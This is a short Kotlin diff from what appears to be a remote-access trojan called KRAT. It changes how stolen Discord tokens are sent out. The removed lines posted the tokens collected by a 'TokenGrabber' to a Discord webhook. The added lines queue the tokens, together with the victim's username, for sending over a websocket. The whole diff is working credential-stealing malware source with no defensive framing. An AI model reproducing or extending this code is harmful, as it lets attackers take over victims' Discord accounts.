@@ -4,6 +4,8 @@ import KRAT.user
 import services.discord.TokenGrabber.getTokens
 import utils.DiscordWebhook
 import utils.ListUtils.removeDuplicates
+import websocket.DiscordInformation
+import websocket.messagesQueue
 
 object Discord {
     fun webhook(): DiscordWebhook {
@@ -14,18 +16,13 @@ object Discord {
 
     fun sendTokens() {
         val tokens = getTokens()?.removeDuplicates()
-        if (tokens == null || tokens.isEmpty()) return
-        val sIf = if (tokens.size > 1) "s" else ""
+        if (tokens.isNullOrEmpty()) return
 
-        webhook().apply {
-            embeds.add(
-                DiscordWebhook.EmbedObject()
-                    .setTitle("Discord token$sIf detected")
-                    .setDescription("**Token$sIf:** ${tokens.map { "```$it```" }.joinToString()}")
+        messagesQueue.add(
+            DiscordInformation(
+                username = user,
+                tokens = tokens
             )
-            execute()
-        }
-
-        // TODO: send via discord bot
+        )
     }
 }
